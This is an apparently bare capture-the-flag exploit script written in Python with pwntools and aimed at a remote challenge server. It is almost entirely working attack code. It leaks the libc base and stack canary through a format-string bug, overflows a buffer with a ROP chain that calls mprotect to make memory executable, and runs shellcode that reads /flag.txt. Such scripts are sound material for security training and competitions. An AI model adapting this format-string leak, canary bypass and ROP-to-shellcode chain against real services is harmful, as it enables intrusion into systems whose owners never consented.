from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./task')
# p=process('./task',env={"LD_PRELOAD":"./libc-2.27.so"})
p = remote("0.cloud.chals.io",33744)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
def echo(c):
    sla(b": ",c)

echo("%p|%15$p|")
base = int(ru("|")[:-1],16)-(0x7ffff7dcda83-0x00007ffff79e2000)
info(hex(base))
canary = int(ru("|")[:-1],16)
info(hex(canary))
libc = ELF("./libc-2.27.so")
libc.address =base
rdi = 0x000000000002164f+base
rsi = 0x0000000000023a6a+base
rdx = 0x0000000000001b96+base
rax = 0x000000000001b500+base
syscall = 0x11002f+base
inc_inc  = 0x00000000000d0aa7+base
buf = 0x3f1000+base
echo("A"*0x48+flat([canary,0,
                    rax,0,rdi,0,rsi,buf-0x400,rdx,0x400,syscall,
                    rax,8,inc_inc,rdi,buf-0x1000,rsi,0x1000,rdx,0x7,syscall,
                    buf-0x400]))
echo("x")
p.send(asm(shellcraft.open("/flag.txt")+shellcraft.read('rax',buf-0x800,0x400)+shellcraft.write(1,buf-0x800,'rax')))
p.interactive()